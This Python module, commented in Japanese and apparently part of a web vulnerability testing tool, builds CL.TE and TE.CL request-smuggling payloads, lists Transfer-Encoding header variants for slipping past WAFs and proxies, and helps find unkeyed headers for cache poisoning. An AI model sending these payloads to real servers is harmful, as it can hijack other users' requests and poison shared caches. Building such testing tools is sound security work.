"""
HTTP Request Smuggling & Cache Poisoning Tester

検知ロジックとペイロード生成のみを担当。
実際の攻撃実行は行わない（EthicsGuard/CollaborativeModeで制御）。

1. Smuggling: CL.TE / TE.CL の不整合を引き起こすヘッダー生成
2. Cache Poisoning: Unkeyed Inputの検出とポイズニング候補ヘッダーの特定
"""

from typing import Dict, List, Tuple
from dataclasses import dataclass

@dataclass
class SmugglingPayload:
    attack_type: str  # CL.TE or TE.CL
    headers: Dict[str, str]
    body: bytes
    description: str

class SmugglingTester:
    """HTTP Request Smuggling 脆弱性診断ヘルパー"""
    
    def generate_cl_te_payload(self, target_host: str, prefix_payload: str) -> SmugglingPayload:
        """
        CL.TE (Front-end uses Content-Length, Back-end uses Transfer-Encoding)
        フロントエンドはCLを見てボディ全体を転送するが、
        バックエンドはTEを見て最初のチャンク(0)で終了とみなし、残りを次のリクエストの先頭として処理する。
        """
        # CL.TEの場合:
        # フロントエンド: 全体を1つのリクエストとして見る
        # バックエンド: 0\r\n\r\n でリクエスト終了と判断 -> 残りの 'G' 以降が次のリクエストの先頭になる
        
        # 実際に攻撃を成立させるには巧妙なバイト計算が必要だが、ここでは概念実証用の構造を生成
        smuggled_prefix = f"{prefix_payload}\r\nIgnore: " 
        
        # ボディの構築
        # Chunked形式: サイズ(16進数)\r\nデータ\r\n0\r\n\r\n
        body_content = "0\r\n\r\n" + smuggled_prefix
        
        headers = {
            "Host": target_host,
            "Content-Length": str(len(body_content)),
            "Transfer-Encoding": "chunked"
        }
        
        return SmugglingPayload(
            attack_type="CL.TE",
            headers=headers,
            body=body_content.encode(),
            description="Front-end uses Content-Length, Back-end uses Transfer-Encoding"
        )

    def generate_te_cl_payload(self, target_host: str, prefix_payload: str) -> SmugglingPayload:
        """
        TE.CL (Front-end uses Transfer-Encoding, Back-end uses Content-Length)
        フロントエンドはTEを見てChunked転送するが、
        バックエンドはCLを見て途中でリクエストを切る（あるいは長く読む）。
        """
        # TE.CLの場合:
        # フロントエンド: Chunkedとして正しく処理してバックエンドに送る
        # バックエンド: CL分だけ読んで、残りが次のリクエストの先頭になる
        
        chunk_size = hex(len(prefix_payload))[2:]
        body_content = f"{chunk_size}\r\n{prefix_payload}\r\n0\r\n\r\n"
        
        # CLはチャンクヘッダ部分のみを含む短い長さに偽装する必要がある（またはバックエンドの挙動による）
        # ここではTE.CLの典型的な「フロントエンドはChunkedとして送る」パターン
        # 実際にはTransfer-Encodingの難読化（"Transfer-Encoding: chunked"）などが必要になることが多い
        
        headers = {
            "Host": target_host,
            "Content-Length": "4", # 偽の長さ（バックエンド用）
            "Transfer-Encoding": "chunked"
        }
        
        return SmugglingPayload(
            attack_type="TE.CL",
            headers=headers,
            body=body_content.encode(),
            description="Front-end uses Transfer-Encoding, Back-end uses Content-Length"
        )

    def detect_obfuscation_vectors(self) -> List[Dict[str, str]]:
        """
        WAF/ProxyのTE解析回避用ヘッダー変種
        """
        return [
            {"Transfer-Encoding": "chunked"},
            {"Transfer-Encoding": "xchunked"},
            {"Transfer-Encoding ": "chunked"},
            {"Transfer-Encoding": "\tchunked"},
            {" Transfer-Encoding": "chunked"},
            {"X: X": "\nTransfer-Encoding: chunked"}
        ]

class CachePoisoner:
    """Web Cache Poisoning 脆弱性診断ヘルパー"""
    
    UNKEYED_HEADERS = [
        "X-Forwarded-Host",
        "X-Host",
        "X-Forwarded-Server",
        "X-Forwarded-Scheme",
        "X-Original-URL",
        "X-Rewrite-URL",
    ]
    
    def detect_unkeyed_input(self, original_resp: str, injected_resps: Dict[str, str]) -> List[str]:
        """
        Unkeyed Inputの検出: ヘッダー注入によりレスポンスが変化するが、
        キャッシュキーには影響しない（＝他のユーザーにも影響する）可能性がある入力を特定。
        これ自体の判定は難しい（キャッシュの挙動を見る必要がある）が、
        まずは「レスポンスに反映されるヘッダー」を探す。
        """
        reflected_headers = []
        for header, resp in injected_resps.items():
            # 簡易判定: ヘッダー値がレスポンスボディに含まれているか
            # 実際にはCanary値を送って確認する
            if "CANARY" in resp: 
                reflected_headers.append(header)
        return reflected_headers

    def generate_cache_buster(self) -> Dict[str, str]:
        """キャッシュバスター（実験用の一意なパラメータ）"""
        import uuid
        return {"cb": str(uuid.uuid4())[:8]}
